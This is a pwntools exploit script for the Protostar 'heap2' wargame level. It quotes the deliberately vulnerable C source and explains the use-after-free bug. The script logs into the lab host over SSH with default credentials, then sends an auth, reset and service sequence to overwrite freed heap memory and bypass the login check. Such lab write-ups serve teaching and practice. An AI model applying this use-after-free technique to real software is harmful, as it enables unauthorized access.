'''
Source:
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
      printf("[ auth = %p, service = %p ]\n", auth, service);

      if(fgets(line, sizeof(line), stdin) == NULL) break;
      
      if(strncmp(line, "auth ", 5) == 0) {
          auth = malloc(sizeof(auth));
          memset(auth, 0, sizeof(auth));
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
      }
      if(strncmp(line, "reset", 5) == 0) {
          free(auth);
      }
      if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);
      }
      if(strncmp(line, "login", 5) == 0) {
          if(auth->auth) {
              printf("you have logged in already!\n");
          } else {
              printf("please enter your password\n");
          }
      }
  }
}

The auth value can be referenced by login() after it is freed. By reusing the
service char array it's position on the heap can be overwritten.
'''

from pwn import *

elf = context.binary = ELF('heap2')
BINPATH = '/opt/protostar/bin/heap2'

if args.REMOTE:
    s = ssh(host='protostar',\
            user='user',\
            password='user')

if args.REMOTE:
    p = s.run(BINPATH)
else:
    p = process('./heap2')

info(p.recvline())
    
info('Creating service...')
p.sendline(b'service jack')
info(p.recvline())

info('Creating auth...')
p.sendline(b'auth jack')

info('Freeing auth memory...')
p.sendlineafter(b']\n', b'reset')
success(p.recvline())
 
info('Sending heap overflow...')
p.sendline(b'service 11111111111111111111111111111')

info('Attempting login...')
p.sendlineafter(b']\n', b'login')
success(p.readline_endswith('already!'))
